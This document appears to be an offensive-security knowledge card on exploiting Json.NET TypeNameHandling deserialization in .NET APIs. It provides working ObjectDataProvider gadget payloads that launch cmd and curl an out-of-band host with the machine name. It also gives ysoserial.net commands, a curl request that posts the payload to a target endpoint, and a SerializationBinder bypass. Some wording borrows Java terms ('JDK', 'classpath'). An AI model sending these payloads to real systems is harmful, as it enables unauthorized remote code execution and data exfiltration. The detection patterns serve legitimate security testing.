# .NET Json.NET TypeNameHandling Deserialization

## Purpose

Test .NET applications using Newtonsoft Json.NET with `TypeNameHandling` settings that allow attacker-controlled `$type` fields to instantiate arbitrary .NET types, enabling RCE through gadget chains without requiring native BinaryFormatter.

## Applicability

- ASP.NET / ASP.NET Core APIs accepting JSON with `$type` fields
- Applications using `JsonConvert.DeserializeObject<object>(json)` or with `TypeNameHandling != None`
- REST APIs, WebAPI endpoints, or JSON-based RPC with polymorphic input types
- SignalR hubs or custom protocol handlers using Json.NET serialization

## Preconditions

- `JsonSerializerSettings.TypeNameHandling` set to `All`, `Objects`, `Arrays`, `Auto`, or `NonPublic` (any value except `None`)
- No `SerializationBinder` restricting allowed types, OR binder is bypassable
- Target runs .NET Framework or .NET Core/5+ with Json.NET (Newtonsoft) in use
- Gadget class available in loaded assemblies (many are JDK/BCL-native)

## Relevant Architecture

```
HTTP POST (application/json)
    → JSON string with "$type": "Some.Namespace.Type, Assembly"
    → JsonConvert.DeserializeObject<object>(json, settings)
        (settings.TypeNameHandling != None)
    → Type.GetType() or binder.BindToType()
    → constructor / property setters invoked
    → gadget property triggers dangerous action
        (ObjectDataProvider → MethodName → process exec)
        (WindowsIdentity → NTLM auth leak)
        (ResourceSet → arbitrary file read)
```

## Technical Knowledge

**TypeNameHandling values**
```csharp
// All of these enable $type resolution (dangerous):
settings.TypeNameHandling = TypeNameHandling.All;
settings.TypeNameHandling = TypeNameHandling.Objects;
settings.TypeNameHandling = TypeNameHandling.Arrays;
settings.TypeNameHandling = TypeNameHandling.Auto;

// Safe:
settings.TypeNameHandling = TypeNameHandling.None;   // default
```

**Detection via $type echo**
When TypeNameHandling is active, serialization output includes `$type`:
```json
{"$type":"MyApp.Models.User, MyApp","Username":"alice"}
```

**Key gadget chains (ysoserial.net)**

| Chain | Primitive | Notes |
|-------|-----------|-------|
| `ObjectDataProvider` | Process execution via `MethodName` property | Most common; .NET Framework |
| `WindowsIdentity` | NTLM auth trigger / coerce auth | Useful for NTLM relay |
| `ResourceSet` | File read (arbitrary path) | Limited impact but useful for LFI |
| `TypeConfuseDelegate` | Full RCE | Works with Json.NET when combined with BinaryFormatter gadget classes |

**ObjectDataProvider payload**
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": ["cmd", "/c curl http://<oast>/?x=%COMPUTERNAME%"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}
```

**ysoserial.net for Json.NET**
```powershell
# Generate Json.NET payload
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw `
  -c "cmd /c curl http://<oast>/?x=%COMPUTERNAME%"
```

**Version considerations**
- `PresentationFramework.dll` (WPF) not available in .NET Core / ASP.NET Core on Linux
- For ASP.NET Core on Linux: use `WindowsIdentity` (cross-platform) or find classpath-available gadgets
- Json.NET 13.0.1+: no built-in protection against `$type` injection — security is entirely on the caller

**SerializationBinder bypass**
```csharp
// A restrictive binder (safe):
public class SafeBinder : ISerializationBinder {
    public Type BindToType(string assemblyName, string typeName) {
        if (typeName == "MyApp.Models.User") return typeof(User);
        throw new JsonSerializationException($"Type not allowed: {typeName}");
    }
}
// If binder only checks typeName without assembly, try:
// "$type":"System.Diagnostics.Process, MyApp"  (wrong assembly, same type name check bypassed)
```

## Indicators

**Black-box**
- JSON response contains `$type` field with assembly-qualified type name
- `JsonSerializationException: Type 'X' is not a subclass of 'Y'` — type resolution active
- Changing `$type` value changes application behavior or error type
- API accepts `application/json` with polymorphic field and returns typed response

**White-box**
```csharp
// Vulnerable patterns:
JsonConvert.DeserializeObject<object>(json, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // or Objects, Auto, Arrays
});

// Also vulnerable (globally set):
JsonSerializer serializer = JsonSerializer.Create(settings);
T result = serializer.Deserialize<T>(reader);

// Grep for:
TypeNameHandling.All
TypeNameHandling.Objects
TypeNameHandling.Auto
TypeNameHandling.Arrays
```

## Interpretation

1. **`$type` in serialized response** → TypeNameHandling active on this path; test polymorphic input
2. **`JsonSerializationException: Could not load type`** → type resolution happening; class not found — try qualified assembly name
3. **`MethodAccessException`** or `SecurityException` on ObjectDataProvider → .NET Core may restrict WPF types; use alternative gadget
4. **OOB HTTP/DNS callback** → code execution or coerced auth confirmed
5. **Binder-related exception (`Type not allowed`)** → SerializationBinder present; attempt bypass by manipulating assembly name component

## Security-Relevant Conditions

- **`TypeNameHandling.All` globally**: Every JSON object with `$type` is dangerous — widest attack surface
- **`TypeNameHandling.Auto`**: Only when JSON value is `object` typed — look for `object` properties in API schema
- **No `SerializationBinder`**: Any assembly-qualified type is instantiable
- **ASP.NET Core on Linux**: `PresentationFramework` unavailable; pivot to `WindowsIdentity` or classpath-available gadgets
- **SignalR with custom resolvers**: Hub method arguments may use TypeNameHandling internally

## Experiment Considerations

- First confirm `$type` is processed: submit `"$type":"System.String, mscorlib"` — if behavior changes or error mentions the type, resolution is active
- Use DNS/HTTP OAST payload as first exec test (OOB curl via cmd)
- For .NET Core, prepare alternative gadgets — ObjectDataProvider requires WPF (`PresentationFramework.dll`) not available on Linux
- Match assembly `Version` and `PublicKeyToken` to target .NET version if errors mention version mismatch

## Evidence Expectations

1. `$type` with gadget class name injected in JSON body
2. OOB HTTP/DNS callback received → type instantiated, gadget executed
3. Command output (`%COMPUTERNAME%`, `%USERNAME%`) exfiltrated OOB
4. Document: API endpoint, JSON field path containing `$type`, `TypeNameHandling` value (if determinable), gadget chain name, .NET version, assembly versions in payload

## Failure Interpretation

| Observation | Interpretation |
|-------------|---------------|
| `$type` ignored, deserialized as literal string | TypeNameHandling is `None`; check other endpoints or sub-fields |
| `JsonSerializationException: Type not allowed` | SerializationBinder present; attempt bypass or find unbounded path |
| `FileNotFoundException: PresentationFramework` | .NET Core/Linux; ObjectDataProvider unavailable — use WindowsIdentity |
| Exec payload works but no output | Blind RCE; ensure OOB command has curl/nslookup and egress allowed |
| `MethodAccessException` on Process.Start | .NET Core process isolation; try file write gadget or coerce NTLM |

## False Positives

- `$type` present in response JSON but `TypeNameHandling` only applied during serialization, not deserialization — test by sending `$type` in input and observing behavior change
- Custom `IContractResolver` overrides type handling securely — inspect implementation
- `TypeNameHandling.Auto` used on a strongly-typed `DTO` class without `object` fields — no polymorphic path to inject through

## Limitations

- ObjectDataProvider / WPF gadgets unavailable on .NET Core / .NET 5+ without WPF runtime
- `SerializationBinder` effectively mitigates if implemented correctly — bypass may require source code review
- Gadget chains evolve; absence of known ysoserial.net chain doesn't guarantee safety
- Assembly version mismatch in `$type` causes load failure — requires accurate version fingerprinting

## Related Knowledge

- `dotnet-binaryformatter` — when the .NET sink is BinaryFormatter/ViewState rather than Json.NET
- `java-polymorphic-json` — analogous type confusion in Jackson/Fastjson
- Json.NET documentation on `TypeNameHandling` security warnings
- CVE-2019-0604 (SharePoint) — Json.NET TypeNameHandling exploitation at scale
- ysoserial.net Json.Net generator documentation

## Tooling

```powershell
# Generate Json.NET ObjectDataProvider payload (Windows)
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw `
  -c "cmd /c curl http://<oast>/?x=%COMPUTERNAME%"

# WindowsIdentity payload (cross-platform .NET Core)
ysoserial.exe -f Json.Net -g WindowsIdentity -o raw `
  -c "cmd /c nslookup <oast>"
```

```bash
# Send payload via curl (Linux testing machine)
curl -s -X POST https://target/api/endpoint \
  -H 'Content-Type: application/json' \
  -d '{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName": "Start",
    "MethodParameters": {
      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
      "$values": ["cmd", "/c curl http://<oast>/?x=%COMPUTERNAME%"]
    },
    "ObjectInstance": {
      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
    }
  }'
```